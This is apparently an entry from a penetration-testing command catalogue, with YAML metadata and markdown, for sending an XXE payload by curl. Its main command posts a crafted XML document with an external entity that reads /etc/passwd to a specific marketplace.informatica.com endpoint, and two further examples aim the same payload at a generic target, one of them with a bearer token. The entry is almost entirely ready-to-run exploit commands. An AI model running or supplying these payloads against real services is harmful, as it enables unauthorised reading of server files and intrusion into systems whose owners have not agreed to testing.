---
data: >-
  curl -X POST
  https://marketplace.informatica.com/__services/v2/rest/wall/new/count -H
  "Content-Type: application/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM
  "file:///etc/passwd1" >]><foo>&xxe;</foo>'
tags:
  - http
  - xxe
  - payload
type: command
executor: bash
platforms:
  - Linux
  - Web
id: ebce90a8-c730-4097-a868-c9475e5ad3da
created_at: '2025-12-13T09:00:27.488Z'
updated_at: '2025-12-13T09:00:27.488Z'
verified: false
validated: true
submitted: true
---
# curl-send-malicious-xml-payload

## Command

```bash
curl -X POST https://marketplace.informatica.com/__services/v2/rest/wall/new/count -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd1" >]><foo>&xxe;</foo>'
```

## Description

Sends a malicious XML payload via POST to test for XXE vulnerabilities, attempting to read a system file through entity inclusion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/xml"` | Sets XML content type | Yes |
| `-d 'xml_payload'` | The malicious XML data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/endpoint -H "Content-Type: application/xml" -H "Authorization: Bearer token" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## Expected Output

Server response with JAXBException or file contents if vulnerable.

## Related

- [[commands/curl-authenticated-post-xml]]
- [[procedures/Test-XXE-Vulnerability-via-POST-to-Wall-Count-Endpoint]]
